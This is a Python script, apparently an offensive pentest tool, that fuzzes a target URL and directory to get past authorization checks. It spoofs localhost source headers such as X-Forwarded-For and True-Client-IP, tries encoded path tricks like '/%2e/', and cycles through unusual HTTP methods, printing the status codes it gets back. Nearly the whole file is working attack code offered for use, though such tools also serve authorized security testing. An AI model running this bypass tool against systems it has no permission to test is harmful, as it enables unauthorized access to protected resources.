import asyncio
import httpx
import argparse
from tqdm.asyncio import tqdm

parser = argparse.ArgumentParser(description="Go beyond the world of Authorization")
parser.add_argument('-u', '--url', type=str, help="ex. https://example.com", required=True)
parser.add_argument('-t', '--timeout', type=int, help="timeout in seconds", default=10)
parser.add_argument('-d', '--directory', type=str, help="Directory to work with", required=True)
parser.add_argument('-a', '--admin', type=bool, help="Run with admin headers", default=False)
args = parser.parse_args()

url = args.url
directory = args.directory
timeout = args.timeout
admin_mode = args.admin

headers_list = [
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded": "127.0.0.1"},
    {"Forwarded-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Original-URL": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Cluster-Client-IP": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"Host": "localhost"}
]

path_payloads = ["//", "/%2e/", "/%252e**/", "/%ef%bc%8f"]
methods = ["GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH", "INVENTED", "HACK"]

async def fetch_with_retry(client, url, method="GET", headers=None, retries=3):
    for attempt in range(retries):
        try:
            response = await client.request(method=method, url=url, headers=headers, timeout=timeout, follow_redirects=True)
            return response
        except httpx.ConnectTimeout:
            if attempt < retries - 1:
                await asyncio.sleep(1)
            else:
                return None

async def path_fuzzer(client, url):
    tasks = []
    for payload in path_payloads:
        task = await fetch_with_retry(client, f"{url}{payload}{directory}")
        tasks.append((task, payload))
    
    for task, payload in tqdm(tasks, total=len(tasks), desc="Path Fuzzing"):
        resp = task
        if resp:
            print(f"[+] Path Fuzzing: {resp.url} - Status Code: {resp.status_code} - Payload: {payload}")
        else:
            print(f"[-] Path Fuzzing: {url} - Payload: {payload} - Connection Timeout")

async def method_fuzzer(client, url):
    tasks = []
    for mthd in methods:
        task = await fetch_with_retry(client, f"{url}/{directory}", method=mthd)
        tasks.append((task, mthd))
    
    for task, mthd in tqdm(tasks, total=len(tasks), desc="Method Fuzzing"):
        resp = task
        if resp:
            print(f"[+] Method Fuzzing: {resp.request.method} {resp.url} - Status Code: {resp.status_code}")
        else:
            print(f"[-] Method Fuzzing: {mthd} {url} - Connection Timeout")

async def header_fuzzer(client, url):
    tasks = []
    for headers in headers_list:
        task = await fetch_with_retry(client, f"{url}/{directory}", headers=headers)
        tasks.append((task, headers))
    
    for task, headers in tqdm(tasks, total=len(tasks), desc="Header Fuzzing"):
        resp = task
        if resp:
            headers_used = {k: v for k, v in resp.request.headers.items() if k in headers.keys()}
            print(f"[+] Header Fuzzing: {resp.url} - Status Code: {resp.status_code} - Headers: {headers_used}")
        else:
            print(f"[-] Header Fuzzing: {url} - Headers: {headers} - Connection Timeout")

async def main():
    async with httpx.AsyncClient() as client:
        if admin_mode:
            await header_fuzzer(client, url)
        else:
            await asyncio.gather(
                method_fuzzer(client, url),
                path_fuzzer(client, url)
            )

asyncio.run(main())
